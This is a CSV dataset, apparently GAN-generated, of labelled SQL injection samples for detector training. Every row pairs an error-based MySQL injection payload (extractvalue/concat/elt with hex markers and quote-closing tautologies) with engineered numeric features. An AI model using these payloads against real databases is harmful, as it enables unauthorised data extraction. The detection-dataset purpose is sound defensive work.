id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000092,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'mevd'  =  'mevd",nearest_attack_euclidean,R000153,3.9968368983622247,170.72988891601562,44.541358947753906,34.917579650878906,64.89556121826172,0.24003586173057556,50.398475646972656,24.084035873413086,1.0727972984313965,0.2514477074146271,0.21163024008274078,0.3853040337562561,0.12880218029022217,3.6749706268310547,0.8589618802070618,1.0695217847824097,0.5283162593841553,0.171346515417099,-0.002421800745651126,-0.018610909581184387,6.160162448883057,6.4159932136535645,4.60567045211792,0.12550540268421173,1.3090931177139282,0.27865085005760193,-0.04500570520758629,0.07601147890090942,0.0306563638150692,0.18930770456790924,-0.108579620718956,-0.1626199334859848,2.8708131313323975,0.09367135912179947,0.35513174533843994,1.5574491024017334,4.59781551361084,0.8457210659980774,1.1844539642333984,-0.08190782368183136,0.3907722234725952,0.23092499375343323,0.20533952116966248,0.18398575484752655,0.3961924612522125,-0.13614580035209656,-0.028923220932483673,0.03368866443634033,0.05429840460419655,0.06889238953590393,-0.05963531509041786,-0.018734799697995186,-0.04322075843811035,0.14375343918800354,-0.08600101619958878,-0.13169430196285248,0.2573830485343933,0.10044547915458679,-0.14825180172920227,0.33971530199050903,-0.00892253965139389,-0.1475655734539032,-0.13910093903541565,0.09768161177635193,0.0947675108909607,0.009566791355609894,0.9794058799743652,-0.01043856143951416,0.10126693546772003,-0.11002291738986969,-0.002776414155960083,-0.20393921434879303,-0.016634240746498108,0.03258001059293747,0.01655568927526474,0.11187390983104706,1.1247546672821045,0.2844143211841583,-0.1720021665096283,0.14361415803432465,0.11403637379407883,4.375485420227051,0.6052177548408508,0.2624250054359436,0.14055512845516205,0.898892879486084,-0.023429229855537415,-0.13313814997673035,0.08804425597190857
GAN_000093,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'mevd'  =  'mevd",nearest_attack_euclidean,R000153,4.036531911986635,170.4141845703125,44.92600631713867,34.16990661621094,65.37104797363281,0.07863344252109528,49.722904205322266,23.93227767944336,1.2212337255477905,0.24512343108654022,0.20759806036949158,0.38829511404037476,0.12850575149059296,3.680778980255127,1.0966631174087524,1.1587178707122803,0.4582797884941101,0.14450256526470184,-0.0012639376800507307,-0.11622466892004013,6.0416579246521,6.374448776245117,4.416440963745117,0.10249030590057373,1.3276031017303467,0.1133245974779129,-0.13892504572868347,0.05128584802150726,-0.00819336250424385,0.1658225804567337,0.048550527542829514,0.08093234151601791,2.715339183807373,0.275953471660614,0.4145067036151886,1.3619468212127686,4.465726852416992,0.5596302151679993,1.0883530378341675,0.01722138375043869,0.32963472604751587,0.27527859807014465,-0.055951789021492004,0.1436333805322647,0.1504133641719818,-0.0630057230591774,-0.23435074090957642,0.01383928395807743,0.013206236064434052,0.040301114320755005,-0.06768952310085297,0.038235854357481,-0.157760888338089,0.12270801514387131,-0.044701822102069855,-0.12300285696983337,-0.03296798840165138,0.10254855453968048,0.028617992997169495,0.051840461790561676,-0.11335471272468567,0.2783873975276947,0.00981391966342926,0.03613444045186043,0.08637341856956482,0.07651504874229431,0.9982120990753174,0.10695802420377731,0.08566781133413315,-0.22173544764518738,-0.015493258833885193,-0.20784181356430054,0.05069369822740555,0.23710674047470093,0.010170596651732922,0.25443077087402344,1.0601704120635986,0.200540691614151,-0.2207247018814087,0.01040349155664444,0.10675334930419922,4.116987705230713,0.6851702928543091,0.21677619218826294,0.03756185621023178,0.8983776569366455,0.021426700055599213,0.1489114761352539,-0.19579455256462097
GAN_000094,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'mevd'  =  'mevd",nearest_attack_euclidean,R000153,3.8781622789576873,171.2099609375,45.6409912109375,35.51807403564453,68.04545593261719,0.6315799355506897,49.24250793457031,23.224699020385742,0.9583354592323303,0.2605157494544983,0.20605100691318512,0.3905869722366333,0.12789364159107208,3.6892635822296143,0.8830509185791016,1.189620018005371,0.5736908316612244,0.1294936239719391,0.03813696280121803,0.0442776195704937,5.959741592407227,6.592491149902344,4.8274827003479,0.15028896927833557,1.3427035808563232,0.23053762316703796,-0.08729521930217743,0.09403875470161438,0.08949898183345795,0.2005198448896408,-0.08401614427566528,-0.09550373256206512,2.7425806522369385,0.01917547546327114,0.37263044714927673,1.4756088256835938,4.592380523681641,0.9497491121292114,1.121224045753479,-0.16112402081489563,0.3263685405254364,0.22221285104751587,-0.1113433837890625,0.21810266375541687,0.06918264180421829,-0.15999844670295715,-0.17948099970817566,0.05314052477478981,0.06045028194785118,0.054395437240600586,-0.02091543935239315,-0.0157176461070776,-0.14830562472343445,0.20685270428657532,0.011357218027114868,-0.045956626534461975,0.0362248569726944,0.09693343937397003,-0.00951702892780304,0.02259763330221176,0.11191153526306152,0.003747493028640747,-0.1491554081439972,-0.024436423555016518,0.061439525336027145,-0.026589399203658104,0.94841068983078,0.10398904234170914,0.18300408124923706,0.11390597373247147,-0.07082054764032364,-0.12582410871982574,0.017744123935699463,0.08001392334699631,0.0190338846296072,-0.025495268404483795,1.1682623624801636,0.3038545250892639,0.01877152919769287,0.03169969469308853,-0.02864183485507965,4.086693286895752,0.5666050314903259,0.18546831607818604,0.1261625438928604,0.8374340534210205,0.008521463721990585,-0.05301947519183159,-0.04802917316555977
GAN_000095,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'mevd'  =  'mevd",nearest_attack_euclidean,R000153,3.7568605502382586,171.20040893554688,45.41145324707031,34.23087692260742,64.59481048583984,0.14648841321468353,48.68196105957031,23.74334144592285,0.9905418157577515,0.2662715017795563,0.21327996253967285,0.3869468867778778,0.13051274418830872,3.7030742168426514,1.0495182275772095,0.8106917142868042,0.38920289278030396,0.15220685303211212,0.015299547463655472,0.05319740250706673,6.2237749099731445,6.313453674316406,4.676085948944092,0.10913710296154022,1.332655668258667,0.21111775934696198,-0.02002137526869774,0.07379353046417236,0.0034186094999313354,0.20591193437576294,-0.036915019154548645,-0.22172096371650696,2.7221174240112305,0.013584505766630173,0.3404703140258789,1.5170212984085083,4.633813858032227,0.8505414128303528,1.272579312324524,-0.012647200375795364,0.38444897532463074,0.21479442715644836,0.08044107258319855,0.1904035061597824,0.19794204831123352,-0.014074325561523438,-0.1526760756969452,0.03563880920410156,0.028231462463736534,0.06908659636974335,-0.02823321335017681,0.012281974777579308,-0.061927713453769684,0.13249000906944275,0.031804218888282776,-0.1912277787923813,-0.00048273801803588867,-0.014801759272813797,0.0010906979441642761,0.2591145634651184,-0.10464221239089966,-0.05580303072929382,-0.13331645727157593,0.1693309098482132,0.06744767725467682,0.03712999075651169,0.9552133679389954,0.237341970205307,0.07072757184505463,-0.09143167734146118,0.056640420109033585,-0.050248075276613235,0.19271716475486755,0.040471769869327545,0.01480486523360014,-0.018364526331424713,0.9948040246963501,0.2775302529335022,-0.14406827092170715,0.09573238343000412,0.14309389889240265,4.400444030761719,0.6583386659622192,0.15369921922683716,0.19034835696220398,0.9207099676132202,-0.002412978559732437,0.07334624975919724,-0.013567067682743073
GAN_000096,attack,error,"1""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""rfpq""  =  ""rfpq",nearest_attack_euclidean,R000061,4.104177610212934,170.00845336914062,46.736385345458984,34.725582122802734,64.80123901367188,0.14274586737155914,48.974796295166016,24.10167121887207,1.2995367050170898,0.2505364418029785,0.20996421575546265,0.39124271273612976,0.1274510622024536,3.6629221439361572,0.9472720623016357,1.4226281642913818,0.6527074575424194,0.12210815399885178,0.006666640751063824,-0.09436768293380737,6.241823673248291,6.381795883178711,4.662744045257568,0.07925883680582047,1.3182878494262695,0.10067904740571976,0.10017670691013336,0.0705471783876419,0.02024022489786148,0.18637490272521973,-0.09793198108673096,0.08583702892065048,2.7633070945739746,0.2597857713699341,0.4431162476539612,1.5027443170547485,4.462428092956543,0.6930251121520996,1.2099535465240479,-0.03821049630641937,0.40936052799224854,0.24457937479019165,-0.010885104537010193,0.17451563477516174,0.2076421082019806,-0.09163666516542435,-0.22247059643268585,0.04038243368268013,0.029021181166172028,0.058281488716602325,-0.09581875801086426,0.012969648465514183,-0.19658920168876648,0.26008957624435425,-0.03787653148174286,-0.15872697532176971,0.2289290726184845,0.07214194536209106,0.11194337904453278,0.1827520728111267,-0.03135725110769272,0.13100987672805786,-0.12272963672876358,0.04026190564036369,0.09804657846689224,-0.004316888749599457,1.0191960334777832,0.012003712356090546,0.09429612010717392,-0.1669306755065918,0.0873713344335556,-0.22173413634300232,0.031077802181243896,0.14309126138687134,0.01937943510711193,0.06918562203645706,1.141789436340332,0.28382474184036255,-0.1528664231300354,0.005206257104873657,-0.056889452040195465,4.00981330871582,0.6159306764602661,0.1758873015642166,0.07309751957654953,0.9229350686073303,0.009075045585632324,-0.028087377548217773,-0.07759958505630493
GAN_000097,attack,error,"1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  'lbwh'  =  'lbwh",nearest_attack_euclidean,R000239,3.796348697760149,171.2237548828125,47.15579605102539,35.354942321777344,65.13259887695312,-0.03272216022014618,47.87116622924805,23.28785514831543,1.2692546844482422,0.2674277424812317,0.20827271044254303,0.38880595564842224,0.12887117266654968,3.7014405727386475,1.1974142789840698,0.9658496379852295,0.48157212138175964,0.11905355006456375,0.01176389493048191,0.12133348733186722,6.2153425216674805,6.471258640289307,4.870226860046387,0.07521849125623703,1.3598111867904663,0.09935351461172104,0.06133658066391945,0.23455235362052917,0.060654670000076294,0.16102011501789093,0.024283122271299362,-0.08592656254768372,2.7754526138305664,0.23234981298446655,0.37884795665740967,1.4439947605133057,4.542390823364258,0.7639379501342773,1.2058442831039429,-0.05183956027030945,0.3841978907585144,0.19719187915325165,0.055107634514570236,0.2047184854745865,0.05592464655637741,-0.01171237975358963,-0.203947514295578,0.05106256902217865,0.04532180726528168,0.041556090116500854,-0.016038043424487114,0.01792963780462742,-0.18046072125434875,0.03182550519704819,-0.0020086979493498802,-0.09589461982250214,0.09354374557733536,0.026353221386671066,0.02639719843864441,0.14757466316223145,-0.05192925035953522,0.17159631848335266,0.001666240394115448,-0.020897414535284042,0.0692235678434372,0.0393499955534935,0.9836891293525696,0.04757729917764664,0.06193140149116516,-0.16394191980361938,0.012057837098836899,-0.2449481040239334,-0.028731778264045715,-0.00138092041015625,0.011295796371996403,0.07108137011528015,0.9544538259506226,0.2965070307254791,-0.08181505650281906,0.05821927636861801,-0.046870194375514984,4.1235785484313965,0.5533800721168518,0.17139188945293427,0.12967023253440857,0.9043369293212891,-0.16232162714004517,-0.04096795618534088,-0.10939667373895645
GAN_000098,attack,error,"1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  'lbwh'  =  'lbwh",nearest_attack_euclidean,R000239,3.723352835754779,170.871826171875,45.22153091430664,35.23943328857422,66.26329040527344,-0.08927904069423676,49.20479202270508,23.58854866027832,1.06186044216156,0.26921021938323975,0.20809343457221985,0.3896830976009369,0.12956655025482178,3.7058563232421875,1.012877345085144,1.0211453437805176,0.459566593170166,0.14318865537643433,0.024187056347727776,0.12985102832317352,6.269263744354248,6.519552230834961,4.917004585266113,0.14468792080879211,1.3376290798187256,0.17078548669815063,-0.02177289128303528,0.09159596264362335,-0.00747000053524971,0.196224182844162,-0.12165273725986481,-0.15575945377349854,2.731391429901123,0.016345854848623276,0.3868156671524048,1.5766549110412598,4.63859748840332,0.8263866901397705,1.2342873811721802,-0.02637893706560135,0.33813512325286865,0.21506889164447784,-0.08281390368938446,0.16852308809757233,0.18754920363426208,-0.03388010710477829,-0.2509611248970032,0.04416154325008392,0.05430171266198158,0.05600806698203087,-0.04801512882113457,-0.015614768490195274,-0.15682274103164673,0.07568072527647018,-0.013691812753677368,-0.2355695217847824,0.018546245992183685,-0.035705216228961945,0.030195504426956177,0.17723485827445984,0.06454509496688843,-0.02412053942680359,-0.11341144889593124,0.03372950479388237,0.05653586983680725,0.011893123388290405,0.954364538192749,0.029734604060649872,0.09113824367523193,0.0002889707684516907,0.05128360912203789,0.0014350498095154762,0.0686076357960701,0.08047547936439514,0.023912668228149414,-0.06470636278390884,1.0994794368743896,0.3596886098384857,-0.05294599384069443,0.09206553548574448,0.058683834969997406,4.252994060516357,0.6529418230056763,0.21496453881263733,0.1308649778366089,0.8888908624649048,-0.05203009396791458,0.13274505734443665,0.00035853683948516846
GAN_000099,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'mevd'  =  'mevd",nearest_attack_euclidean,R000153,4.11006614042448,169.07049560546875,44.865966796875,34.60519027709961,66.35926055908203,0.6372295618057251,48.741641998291016,23.823448181152344,1.1330429315567017,0.26381850242614746,0.2078501433134079,0.3943677842617035,0.12792307138442993,3.6982505321502686,0.8564175367355347,1.196487545967102,0.5526579022407532,0.13965053856372833,0.04241607338190079,0.26802095770835876,6.134265899658203,6.424038410186768,4.862556457519531,0.1706072837114334,1.3303494453430176,0.36023762822151184,0.052082229405641556,0.1935611516237259,0.10818695276975632,0.20597811043262482,-0.016622930765151978,-0.08115769177675247,2.754260540008545,0.19667840003967285,0.395229697227478,1.4591609239578247,4.4739179611206055,0.6138203144073486,1.1888809204101562,-0.1724458932876587,0.3902026116847992,0.23482786118984222,0.023018334060907364,0.22680437564849854,0.15396365523338318,-0.21398353576660156,-0.24866771697998047,0.06104903668165207,0.07807333022356033,0.04338238015770912,-0.036506760865449905,-0.018711769953370094,-0.17086458206176758,0.09845135360956192,-0.09879706054925919,-0.08430536091327667,0.044101323932409286,0.05716365948319435,-0.16892869770526886,-0.13190074265003204,0.18547633290290833,0.1630551815032959,-0.16053012013435364,-0.06303855031728745,0.07639727741479874,0.039869487285614014,0.9504374265670776,0.13078391551971436,0.16168612241744995,-0.049619510769844055,-0.07496284693479538,-0.4059613049030304,-0.17171376943588257,0.07485803961753845,0.014032448641955853,-0.016607284545898438,1.1454460620880127,0.1577795147895813,-0.08208037167787552,0.04289171099662781,-0.09042007476091385,3.92352557182312,0.5814976692199707,0.07994680106639862,-8.452779002254829e-05,0.9183487296104431,-0.08272190392017365,0.0360436886548996,-0.2476903349161148
GAN_000100,attack,error,"1""  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  ""mhfc""  =  ""mhfc",nearest_attack_euclidean,R000212,3.9949185598437174,170.3266143798828,44.02581024169922,34.0880241394043,65.60213470458984,0.17873318493366241,50.03738784790039,24.036720275878906,1.0327376127243042,0.265489786863327,0.20796771347522736,0.39081522822380066,0.13032852113246918,3.6854071617126465,0.8426526784896851,1.1558552980422974,0.36781013011932373,0.13684503734111786,0.0044610509648919106,0.017009444534778595,6.25690221786499,6.4080891609191895,4.687877178192139,0.2367507517337799,1.4573317766189575,0.2148314118385315,0.008238515816628933,0.049895524978637695,-0.0648280456662178,0.2091524451971054,-0.13793344795703888,-0.0755167007446289,2.698786973953247,-0.0294557623565197,0.41614213585853577,1.581964135169983,4.5414137840271,0.7132121920585632,1.3604629039764404,0.04723494499921799,0.3929975926876068,0.24865247309207916,-0.16143471002578735,0.17377197742462158,0.3153891861438751,-0.02465318888425827,-0.3599913716316223,0.03093869611620903,0.00856088474392891,0.061783935874700546,-0.07205527275800705,0.014333071187138557,-0.2939189374446869,0.26514992117881775,0.13086974620819092,-0.4416261315345764,-0.1150314062833786,-0.13165733218193054,0.27761590480804443,0.1519840955734253,0.05732393264770508,0.061968497931957245,-0.23815178871154785,0.01713142916560173,0.06962992250919342,0.07538440823554993,0.9700344204902649,0.3495165705680847,0.021708406507968903,-0.09601578116416931,0.043027739971876144,-0.02309015393257141,0.09375806152820587,0.06082317978143692,0.023639479652047157,-0.010059796273708344,1.0861902236938477,0.3231762945652008,-0.1342325210571289,0.026467762887477875,0.14834263920783997,4.3258161544799805,0.7133215069770813,0.1732501983642578,0.12659507989883423,0.8544773459434509,-0.2051914632320404,0.24271142482757568,-0.019355133175849915
GAN_000101,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'mevd'  =  'mevd",nearest_attack_euclidean,R000153,3.9907438278340757,169.81805419921875,43.47173309326172,35.944923400878906,66.95223236083984,-0.5617439150810242,51.235572814941406,24.341249465942383,1.1807308197021484,0.2555980980396271,0.20843006670475006,0.38776275515556335,0.129846453666687,3.7145206928253174,1.2993803024291992,1.1957387924194336,0.4936448335647583,0.15804116427898407,0.01470798347145319,0.23223063349723816,6.2551045417785645,6.406661033630371,4.909471035003662,-0.019520089030265808,1.3208062648773193,0.1959630250930786,-0.1794402003288269,0.038021013140678406,0.005804695188999176,0.23078297078609467,-0.036371856927871704,-0.3290698230266571,2.8358569145202637,0.22111354768276215,0.38586854934692383,1.5404061079025269,4.502077102661133,0.6310319304466248,1.1841450929641724,-0.11024224013090134,0.41738688945770264,0.20011501014232635,-0.003120899200439453,0.20791585743427277,0.24584081768989563,0.07419046014547348,-0.14367897808551788,0.06631753593683243,0.07296294718980789,0.07517817616462708,-0.0468328632414341,0.025521403178572655,-0.21297916769981384,-0.14440789818763733,-0.1821950525045395,-0.10538165271282196,0.06292139738798141,0.04598240926861763,-0.06687095761299133,0.18445691466331482,-0.05075400322675705,0.414836585521698,-0.1114843413233757,0.0899108350276947,0.04711059108376503,0.006895996630191803,0.9395126700401306,0.1642473042011261,0.17631219327449799,-0.11026996374130249,-0.12852245569229126,-0.09587231278419495,0.13535010814666748,0.16489362716674805,0.020856400951743126,0.00921279564499855,1.0317000150680542,0.16950900852680206,-0.13622808456420898,0.060443215072155,-0.17162930965423584,4.146683216094971,0.7124950289726257,0.3337882459163666,-0.026731709018349648,0.9165837168693542,-0.058147676289081573,0.33329421281814575,0.018026873469352722
GAN_000102,attack,error,"1""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""rfpq""  =  ""rfpq",nearest_attack_euclidean,R000061,4.271973656317276,169.6102752685547,45.74891662597656,34.7491569519043,66.26958465576172,-0.9217767119407654,49.37930679321289,24.449811935424805,1.1147947311401367,0.24461479485034943,0.2072344571352005,0.39431434869766235,0.12802749872207642,3.674945116043091,1.0715006589889526,1.782184362411499,0.7546835541725159,0.10305178910493851,0.052602872252464294,0.049950022250413895,6.500400543212891,6.499596118927002,4.829737186431885,-0.006133228540420532,1.175467610359192,0.2675040662288666,0.15753407776355743,-0.1489555686712265,0.0906243771314621,0.2623610496520996,-0.20450401306152344,-0.1042531430721283,2.695483684539795,0.19854137301445007,0.3732147812843323,1.4883242845535278,4.477337837219238,0.724002480506897,1.2709819078445435,-0.15302038192749023,0.4610707759857178,0.24878117442131042,-0.08159072697162628,0.1861172467470169,0.2997994124889374,-0.2354680597782135,-0.1653314083814621,0.08752454817295074,0.07256406545639038,0.10345306247472763,-0.10566172003746033,-0.007101354654878378,-0.09762775152921677,0.30183544754981995,-0.208335742354393,-0.34793150424957275,0.2792246639728546,0.05882732942700386,0.0778568685054779,0.2666068971157074,0.08323265612125397,0.07980988174676895,-0.3344370424747467,-0.1394827663898468,0.09807320684194565,0.02836611121892929,0.9659457206726074,0.27012163400650024,0.15136830508708954,0.002582959830760956,-0.1805403232574463,-0.25163495540618896,0.04897671937942505,0.057751938700675964,0.03495697304606438,-0.15133462846279144,1.2653502225875854,0.15404507517814636,-0.18950632214546204,-0.020690612494945526,-0.06613603979349136,3.7264702320098877,0.7560991644859314,0.10131561756134033,-0.035360075533390045,0.9581089019775391,0.2231770157814026,0.11518984287977219,-0.053490325808525085
GAN_000103,attack,error,"1""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""rfpq""  =  ""rfpq",nearest_attack_euclidean,R000061,4.107303825710084,172.1710662841797,43.73258590698242,32.74285125732422,64.3353500366211,-0.38297122716903687,51.12434005737305,24.898603439331055,0.93076491355896,0.24507221579551697,0.22047556936740875,0.3891967833042145,0.1296573281288147,3.688490152359009,0.8205439448356628,1.3430461883544922,0.4026697874069214,0.14348635077476501,0.018286971375346184,-0.17279385030269623,6.159017562866211,6.334789276123047,4.258479118347168,-0.008584119379520416,1.4104067087173462,0.2107420563697815,-0.07854712009429932,-0.18919508159160614,0.01838705688714981,0.22712260484695435,-0.0044075921177864075,-0.0812581330537796,2.728435754776001,0.016526909545063972,0.3947300612926483,1.443691372871399,4.550815582275391,0.8313612341880798,1.338575005531311,0.09275058656930923,0.34047311544418335,0.19198642671108246,-0.12834396958351135,0.24876941740512848,0.26109543442726135,-0.17037847638130188,0.019146546721458435,0.00956229493021965,0.03893100097775459,0.08309493958950043,-0.10632742941379547,-0.015382325276732445,-0.11318867653608322,0.20112013816833496,-0.15790799260139465,-0.3185310959815979,-0.014583546668291092,0.022323276847600937,0.11056056618690491,0.29250967502593994,-0.042272210121154785,-0.05561705678701401,-0.16034749150276184,0.013427283614873886,0.0966474637389183,-0.07647762447595596,0.9958357810974121,0.453824907541275,-0.026658223941922188,-0.057621777057647705,0.036996711045503616,-0.03894021734595299,0.3343331813812256,0.1479799896478653,0.02176332287490368,-0.06627852469682693,1.1871612071990967,0.2845208942890167,-0.2924315333366394,0.059277504682540894,0.3204535245895386,4.1413702964782715,0.7459450364112854,0.06841585040092468,0.18199315667152405,0.8982586860656738,0.2370520532131195,0.024219796061515808,-0.06476444005966187
GAN_000104,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'mevd'  =  'mevd",nearest_attack_euclidean,R000153,3.8062926603072085,169.62203979492188,44.22422409057617,34.3193244934082,65.8352279663086,-0.4365925192832947,50.92613220214844,24.28884506225586,0.7864837646484375,0.2557997703552246,0.22023449838161469,0.38711854815483093,0.1285632699728012,3.72200345993042,1.1965851783752441,0.8947389125823975,0.37359216809272766,0.14010435342788696,0.018281077966094017,0.3805055618286133,5.975330352783203,6.545510292053223,4.841758728027344,0.03557854890823364,1.2476098537445068,0.14448070526123047,-0.35189327597618103,0.039515286684036255,0.06148628145456314,0.17074523866176605,-0.05075766146183014,-0.18916019797325134,2.867459297180176,0.16666582226753235,0.4201303720474243,1.3643025159835815,4.526211261749268,0.9544398188591003,1.1758382320404053,-0.012000590562820435,0.2868388295173645,0.21322529017925262,-0.057268038392066956,0.2142709493637085,0.07293254882097244,-0.00375550240278244,0.11844618618488312,0.05184296518564224,0.07613185048103333,0.0666971430182457,-0.04072849825024605,-0.032378796488046646,0.014622017741203308,-0.1894998848438263,-0.23144283890724182,-0.08170647919178009,0.0492798276245594,0.18885938823223114,-0.054891712963581085,0.20817901194095612,-0.1222393661737442,-0.023500002920627594,-0.02995491772890091,0.2075948417186737,0.05487705022096634,-0.10151822865009308,0.9357544183731079,0.11741196364164352,0.18212150037288666,0.026030659675598145,0.03545361012220383,-0.16907338798046112,0.2155560553073883,0.15919364988803864,0.005815296433866024,-0.11895595490932465,1.2538615465164185,0.3079652488231659,-0.20804768800735474,0.10310535132884979,0.18207065761089325,3.982006549835205,0.6837843656539917,0.229786217212677,0.09274383634328842,0.8868190050125122,0.13680756092071533,-0.05385703220963478,-0.0328437015414238
GAN_000105,attack,error,"1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  'lbwh'  =  'lbwh",nearest_attack_euclidean,R000239,3.707747331852347,172.7680206298828,46.353355407714844,35.08152770996094,66.75973510742188,0.30831390619277954,47.98331069946289,23.0692138671875,1.0809208154678345,0.27401846647262573,0.20454932749271393,0.39065060019493103,0.12975622713565826,3.7150063514709473,1.1578556299209595,1.0703341960906982,0.4630720615386963,0.15127304196357727,0.02446640282869339,0.06910308450460434,6.047089099884033,6.517923831939697,4.752050399780273,0.1585511863231659,1.4368741512298584,0.13597062230110168,-0.008445541374385357,0.20768973231315613,0.05585744231939316,0.18921808898448944,0.0059750378131866455,-0.08020506799221039,2.760418176651001,0.018824875354766846,0.3517765700817108,1.4105710983276367,4.596869945526123,0.8680355548858643,1.2215112447738647,-0.009740795940160751,0.2673524022102356,0.19428326189517975,-0.008387453854084015,0.2634626030921936,-0.01085982471704483,-0.0021308735013008118,-0.24944856762886047,0.04722018539905548,0.023258451372385025,0.029581807553768158,0.0073937722481787205,0.023760022595524788,-0.1472061276435852,0.08772646635770798,-0.010284420102834702,-0.08082428574562073,-0.05624144896864891,-0.04952206835150719,0.0016220808029174805,-0.0773094892501831,0.003367900848388672,-0.014686908572912216,-0.07359782606363297,0.027815427631139755,0.052225545048713684,-0.10659854114055634,0.9660263657569885,0.10415001958608627,0.10173025727272034,0.044154517352581024,0.09235669672489166,-0.060843560844659805,0.0022490955889225006,0.14645671844482422,0.014498043805360794,0.09919089078903198,0.9547495245933533,0.320048987865448,0.012434512376785278,0.07532299309968948,0.07269572466611862,4.306582927703857,0.5089307427406311,-0.0027870163321495056,0.1621418595314026,0.8865505456924438,-0.08276160061359406,0.04090140014886856,-0.15234540402889252
